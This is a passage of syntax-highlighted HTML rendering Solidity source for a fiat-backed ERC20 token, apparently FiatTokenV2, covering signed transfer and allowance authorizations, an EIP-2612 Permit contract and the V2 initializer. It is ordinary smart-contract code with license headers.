class=\"token keyword\">function</span> <span class=\"token function\">authorizationState</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> authorizer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        <span class=\"token keyword\">view</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span>AuthorizationState<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _authorizationStates<span class=\"token punctuation\">[</span>authorizer<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nonce<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Verify a signed transfer authorization and execute if valid\n     * @param from          Payer's address (Authorizer)\n     * @param to            Payee's address\n     * @param value         Amount to be transferred\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_transferWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_requireValidAuthorization</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">,</span> validAfter<span class=\"token punctuation\">,</span> validBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n            TRANSFER_WITH_AUTHORIZATION_TYPEHASH<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n            to<span class=\"token punctuation\">,</span>\n            value<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>DOMAIN_SEPARATOR<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: invalid signature\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_markAuthorizationAsUsed</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Verify a signed authorization for an increase in the allowance\n     * granted to the spender and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param increment     Amount of increase in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_increaseAllowanceWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> increment<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_requireValidAuthorization</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">,</span> validAfter<span class=\"token punctuation\">,</span> validBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n            INCREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH<span class=\"token punctuation\">,</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            increment<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>DOMAIN_SEPARATOR<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: invalid signature\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_markAuthorizationAsUsed</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_increaseAllowance</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> increment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Verify a signed authorization for a decrease in the allowance\n     * granted to the spender and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param decrement     Amount of decrease in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_decreaseAllowanceWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> decrement<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_requireValidAuthorization</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">,</span> validAfter<span class=\"token punctuation\">,</span> validBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n            DECREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH<span class=\"token punctuation\">,</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            decrement<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>DOMAIN_SEPARATOR<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: invalid signature\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_markAuthorizationAsUsed</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_decreaseAllowance</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> decrement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Verify a signed approval authorization and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param value         Amount of allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_approveWithAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_requireValidAuthorization</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">,</span> validAfter<span class=\"token punctuation\">,</span> validBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n            APPROVE_WITH_AUTHORIZATION_TYPEHASH<span class=\"token punctuation\">,</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            value<span class=\"token punctuation\">,</span>\n            validAfter<span class=\"token punctuation\">,</span>\n            validBefore<span class=\"token punctuation\">,</span>\n            nonce\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>DOMAIN_SEPARATOR<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: invalid signature\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_markAuthorizationAsUsed</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Attempt to cancel an authorization\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_cancelAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> authorizer<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_requireUnusedAuthorization</span><span class=\"token punctuation\">(</span>authorizer<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n            CANCEL_AUTHORIZATION_TYPEHASH<span class=\"token punctuation\">,</span>\n            authorizer<span class=\"token punctuation\">,</span>\n            nonce\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>DOMAIN_SEPARATOR<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> authorizer<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: invalid signature\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        _authorizationStates<span class=\"token punctuation\">[</span>authorizer<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nonce<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> AuthorizationState<span class=\"token punctuation\">.</span>Canceled<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">AuthorizationCanceled</span><span class=\"token punctuation\">(</span>authorizer<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Check that an authorization is unused\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_requireUnusedAuthorization</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> authorizer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">private</span>\n        <span class=\"token keyword\">view</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            _authorizationStates<span class=\"token punctuation\">[</span>authorizer<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nonce<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span>\n                AuthorizationState<span class=\"token punctuation\">.</span>Unused<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: authorization is used or canceled\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Check that authorization is valid\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_requireValidAuthorization</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> authorizer<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validAfter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> validBefore\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            now <span class=\"token operator\">></span> validAfter<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: authorization is not yet valid\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>now <span class=\"token operator\">&lt;</span> validBefore<span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatTokenV2: authorization is expired\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_requireUnusedAuthorization</span><span class=\"token punctuation\">(</span>authorizer<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Mark an authorization as used\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_markAuthorizationAsUsed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> authorizer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> nonce<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">private</span>\n    <span class=\"token punctuation\">&#123;</span>\n        _authorizationStates<span class=\"token punctuation\">[</span>authorizer<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nonce<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> AuthorizationState<span class=\"token punctuation\">.</span>Used<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">AuthorizationUsed</span><span class=\"token punctuation\">(</span>authorizer<span class=\"token punctuation\">,</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// File: contracts/v2/Permit.sol</span>\n\n<span class=\"token comment\">/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */</span>\n\n\n<span class=\"token comment\">/**\n * @title Permit\n * @notice An alternative to approveWithAuthorization, provided for\n * compatibility with the draft EIP2612 proposed by Uniswap.\n * @dev Differences:\n * - Uses sequential nonce, which restricts transaction submission to one at a\n *   time, or else it will revert\n * - Has deadline (= validBefore - 1) but does not have validAfter\n * - Doesn't have a way to change allowance atomically to prevent ERC20 multiple\n *   withdrawal attacks\n */</span>\nabstract <span class=\"token keyword\">contract</span> <span class=\"token class-name\">Permit</span> <span class=\"token keyword\">is</span> AbstractFiatTokenV2<span class=\"token punctuation\">,</span> EIP712Domain <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bytes32</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> PERMIT_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token number\">0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\")</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> _permitNonces<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Nonces for permit\n     * @param owner Token owner's address (Authorizer)\n     * @return Next nonce\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">nonces</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _permitNonces<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Verify a signed approval permit and execute if valid\n     * @param owner     Token owner's address (Authorizer)\n     * @param spender   Spender's address\n     * @param value     Amount of allowance\n     * @param deadline  The time at which this expires (unix time)\n     * @param v         v of the signature\n     * @param r         r of the signature\n     * @param s         s of the signature\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_permit</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> deadline<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>deadline <span class=\"token operator\">>=</span> now<span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatTokenV2: permit is expired\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n            PERMIT_TYPEHASH<span class=\"token punctuation\">,</span>\n            owner<span class=\"token punctuation\">,</span>\n            spender<span class=\"token punctuation\">,</span>\n            value<span class=\"token punctuation\">,</span>\n            _permitNonces<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">,</span>\n            deadline\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>DOMAIN_SEPARATOR<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: invalid signature\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// File: contracts/v2/FiatTokenV2.sol</span>\n\n<span class=\"token comment\">/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */</span>\n\n\n<span class=\"token comment\">/**\n * @title FiatToken V2\n * @notice ERC20 Token backed by fiat reserves, version 2\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">FiatTokenV2</span> <span class=\"token keyword\">is</span> FiatTokenV1_1<span class=\"token punctuation\">,</span> GasAbstraction<span class=\"token punctuation\">,</span> Permit <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">internal</span> _initializedV2<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Initialize V2 contract\n     * @dev When upgrading to V2, this function must also be invoked by using\n     * upgradeToAndCall instead of upgradeTo, or by calling both from a contract\n     * in a single transaction.\n     * @param newName   New token name\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">initializeV2</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> newName<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token operator\">!</span>_initializedV2<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatTokenV2: contract is already initialized\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        name <span class=\"token operator\">=</span> newName<span class=\"token punctuation\">;</span>\n        DOMAIN_SEPARATOR <span class=\"token operator\">=</span> EIP712<span class=\"token punctuation\">.</span><span class=\"token function\">makeDomainSeparator</span><span class=\"token punctuation\">(</span>newName<span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        _initializedV2 <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token 